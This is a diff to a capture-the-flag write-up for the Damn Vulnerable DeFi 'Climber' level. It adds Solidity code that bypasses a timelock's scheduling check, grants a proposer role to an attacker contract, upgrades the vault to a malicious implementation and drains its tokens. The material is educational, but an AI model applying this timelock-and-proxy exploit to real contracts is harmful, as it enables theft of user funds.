@@ -793,12 +793,104 @@ assertEq(token.balanceOf(playerAddress), VAULT_TOKEN_BALANCE);
 * To be `ReadyForExecution`, we need to pass the same parameters to the contract `schedule()` function. This function requires the `PROPOSER_ROLE`. Also, the operation won't be ready until we set the `delay` variable to `0`.
 * On the side of the `ClimberVault` contract, while there is a `sweeper` role, there is not a clear way to set it nor enable it. Since we could leverage the owner privileges with the `execute()` function, however, we can just upgrade the contract to one which initialization gives a `transfer` to the player.
 * Then, the solution of the level is built the following way:
-  * Leverage the `execution()` function with 4 commands:
-    * First, we give the `PROPOSER_ROLE` to an `AttackerSchedule` contract.
-    * Then, we upgrade the `ClimberVault` instance by an instance of `AttackerVault`.
-    * We update the `delay` to `0` so this operation is marked as `ReadyForExecution`.
-    * Finally, the `AttackerSchedule` instance, having received the parameters to be sent to `execute()`, will call `schedule()` to update the status of the operation.
+* Leverage the `execution()` function with 4 commands:
+* First, we give the `PROPOSER_ROLE` to an `AttackerSchedule` contract.
+
+```solidity
+contract AttackerSchedule {
+  address timelockAddress;
+  bytes payload;
+
+  constructor(address _timelockAddress) {
+    timelockAddress = _timelockAddress;
+  }
+
+  function setSchedule() external {
+    (bool success,) = timelockAddress.call(payload);
+      success;
+  }
+
+  function setPayload(bytes memory _payload) external {
+    payload = _payload;
+  }
+}
+```
+
+```solidity
+targets[0] = address(timelock);
+values[0] = 0;
+dataElements[0] = abi.encodeWithSignature(
+  "grantRole(bytes32,address)",
+  PROPOSER_ROLE,
+  address(attackerSchedule)
+);
+```
+
+* Then, we upgrade the `ClimberVault` instance by an instance of `AttackerVault`.
+
+```solidity
+contract AttackerVault is UUPSUpgradeable {
+  function initialize(address tokenAddress, address playerAddress) public {
+    DamnValuableToken token = DamnValuableToken(tokenAddress);
+    uint256 balance = token.balanceOf(address(this));
+
+    DamnValuableToken(tokenAddress).transfer(playerAddress, balance);
+  }
+
+  // Function required by the interface.
+  function _authorizeUpgrade(address newImplementation) internal override {}
+}
+```
+
+```solidity
+targets[1] = address(level.vault());
+values[1] = 0;
+dataElements[1] = abi.encodeWithSignature(
+  "upgradeToAndCall(address,bytes)",
+  address(attackerVault),
+  abi.encodeWithSignature(
+    "initialize(address,address)",
+    address(level.token()),
+    level.playerAddress()
+  )
+);
+```
+
+* We update the `delay` to `0` so this operation is marked as `ReadyForExecution`.
+
+```solidity
+targets[2] = address(timelock);
+values[2] = 0;
+dataElements[2] = abi.encodeWithSignature(
+  "updateDelay(uint64)",
+  0
+);
+```
+
+* Finally, the `AttackerSchedule` instance, having received the parameters to be sent to `execute()`, will call `schedule()` to update the status of the operation. Notice that these two steps can be done in either order, as `execute()` has not being invoked.
+
+```solidity
+targets[3] = address(attackerSchedule);
+values[3] = 0;
+dataElements[3] = abi.encodeWithSignature(
+  "setSchedule()"
+);
+
+bytes memory payload = abi.encodeWithSignature(
+  "schedule(address[],uint256[],bytes[],bytes32)",
+  targets,
+  values,
+  dataElements,
+  salt
+);
+attackerSchedule.setPayload(payload);
+```
+
 * Calling `execute()` will transfer the funds to the `playerAddress`, completing the challenge.
+
+```solidity
+timelock.execute(targets, values, dataElements, salt);
+```
 
 ### References
 
